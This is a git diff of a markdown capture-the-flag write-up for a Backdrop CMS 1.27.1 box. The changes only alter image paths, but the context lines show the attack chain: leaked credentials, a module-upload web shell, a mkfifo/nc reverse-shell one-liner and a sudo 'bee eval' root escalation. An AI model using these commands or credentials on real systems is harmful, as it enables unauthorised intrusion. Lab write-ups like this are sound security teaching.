@@ -54,19 +54,19 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 Let's start, following the scan we can notice that `/robots.txt` is allowed so, let's check it out:
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020250310134947.png)
+![](cybersecurity/images/Pasted%2520image%252020250310134947.png)
 
 
 If we go to `/?q=admin`, we can check this:
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020250310135422.png)
+![](cybersecurity/images/Pasted%2520image%252020250310135422.png)
 
 As it was clear, we are unable to access admin resources at this point, let's keep looking around.
 
 If we remember the scan correctly, we had a git repository, let's check it out first:
 
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020250310140430.png)
+![](cybersecurity/images/Pasted%2520image%252020250310140430.png)
 
 Nice, we know we are dealing with a `.git` we can use `GitHack` to rebuild the source code from a `.git` folder while keeping the directory structure unchanged.
 
@@ -76,12 +76,12 @@ Nice, we know we are dealing with a `.git` we can use `GitHack` to rebuild the s
 Now, after we use it, we can see this:
 
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020250310175211.png)
+![](cybersecurity/images/Pasted%2520image%252020250310175211.png)
 
 We got a `settings.php` file, let's read it:
 
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020250310175240.png)
+![](cybersecurity/images/Pasted%2520image%252020250310175240.png)
 
 If we try those credentials at the login page, we are unable to log in, it seems like the username is wrong, after looking around for a while I found a file located at:
 
@@ -122,7 +122,7 @@ tiffany:BackDropJ2024DS2024
 
 Now, if try these credentials, we get access:
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020250310175641.png)
+![](cybersecurity/images/Pasted%2520image%252020250310175641.png)
 
 
 Let's start exploitation.
@@ -133,21 +133,21 @@ Let's start exploitation.
 
 We are dealing with `Backdrop CMS 1.27.1`, we can try searching for an exploit regarding this version:
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020250310175803.png)
+![](cybersecurity/images/Pasted%2520image%252020250310175803.png)
 
 
 When we use the exploit:
 
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020250310180447.png)
+![](cybersecurity/images/Pasted%2520image%252020250310180447.png)
 
 Let's go to the URL and upload the crafted payload:
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020250310180517.png)
+![](cybersecurity/images/Pasted%2520image%252020250310180517.png)
 
 
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020250310180534.png)
+![](cybersecurity/images/Pasted%2520image%252020250310180534.png)
 
 So, we need to modify the file for it to match `.tar.gz`, in order to automate the process, I modified the python script:
 
@@ -245,11 +245,11 @@ Now, let's upload our file and visit this:
 modules/shell/shell.php
 ```
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020250310181029.png)
+![](cybersecurity/images/Pasted%2520image%252020250310181029.png)
 
 Let's try to execute a command:
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020250310181304.png)
+![](cybersecurity/images/Pasted%2520image%252020250310181304.png)
 
 There we go, we got RCE, let's send ourselves a reverse shell:
 
@@ -257,7 +257,7 @@ There we go, we got RCE, let's send ourselves a reverse shell:
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc IP PORT >/tmp/f
 ```
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020250310181823.png)
+![](cybersecurity/images/Pasted%2520image%252020250310181823.png)
 
 Let's begin privesc.
 
@@ -277,7 +277,7 @@ First thing to do is to stable our shell:
 
 Once we are in the machine, we can see which users are in here too:
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020250310182315.png)
+![](cybersecurity/images/Pasted%2520image%252020250310182315.png)
 
 We got another user `johncusack`, we can try switching user using the credentials we found at the beginning:
 
@@ -414,7 +414,7 @@ cd /var/www/html
 sudo /usr/local/bin/bee eval "system('/bin/bash');"
 ```
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020250310184558.png)
+![](cybersecurity/images/Pasted%2520image%252020250310184558.png)
 
 We got root access and can finally access our final flag:
 
@@ -425,5 +425,5 @@ root@dog:/var/www/html# cat /root/root.txt
 
 Just like that, CTF is done.
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020250310184641.png)
+![](cybersecurity/images/Pasted%2520image%252020250310184641.png)
 
